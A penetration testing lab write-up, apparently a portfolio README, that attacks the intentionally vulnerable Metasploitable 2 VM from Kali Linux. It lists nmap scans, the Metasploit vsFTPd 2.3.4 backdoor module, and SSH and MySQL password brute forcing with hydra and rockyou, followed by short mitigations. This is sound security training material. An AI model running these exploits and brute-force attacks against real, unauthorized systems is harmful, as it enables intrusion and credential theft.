# Penetration Testing & Vulnerability Assessment (Kali Linux + Metasploitable 2)

## 📌 Overview
This project demonstrates a full penetration testing workflow using **Kali Linux** as the attacker machine and **Metasploitable 2** as the vulnerable target.

The goal was to simulate real-world attacks, identify vulnerabilities, exploit them, and recommend mitigation strategies.

---

## 🎯 Objectives
- Perform network reconnaissance
- Identify open ports and services
- Exploit vulnerabilities
- Perform post-exploitation
- Recommend security fixes

---

## 🧪 Lab Setup

### 🔹 Attacker Machine
- Kali Linux  
- Tools: Nmap, Metasploit, Burp Suite, Wireshark  

### 🔹 Target Machine
- Metasploitable 2 (intentionally vulnerable OS)

### 🔹 Environment
- VirtualBox / VMware  
- Network: NAT / Host-only  

---

## 🔍 Methodology

### Phase 1: Reconnaissance & Scanning

**Tools Used:**
- Nmap  
- Netdiscover  

**Key Commands:**
```bash
netdiscover -r 192.168.50.0/24
```

Port Scanning
```bash
nmap -sV -A -T4 <target_ip>
nmap --script vuln <target_ip>
```
## 💥 Phase 2: Exploitation

###🔥 vsFTPd Backdoor (Port 21)
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target_ip>
exploit
```

## ✅ Result: Root shell access

### 🔐 SSH Brute Force (Port 22)

```bash
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE wordlist.txt
run
```

Alternative:
**Key Commands:**
```bash
hydra -l user -P wordlist.txt <target_ip> ssh
```

## 🗄️ MySQL Exploit (Port 3306)
**Key Commands:**
```
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE rockyou.txt
run
```
## 🧠 Phase 3: Post-Exploitation

- Extracted sensitive files
- Maintained system access
- Explored system directories

  
## 🚨 Finding
- svsFTPd backdoor allowed remote code execution
- Weak SSH credentials enabled brute force access
- MySQL default credentials exposed database

  
## 🛡️ Mitigation
- Disable vulnerable services
- Enforce strong passwords
- Restrict database access
- Regular system updates

## 👤 Author

*Emmanuel Akeju*
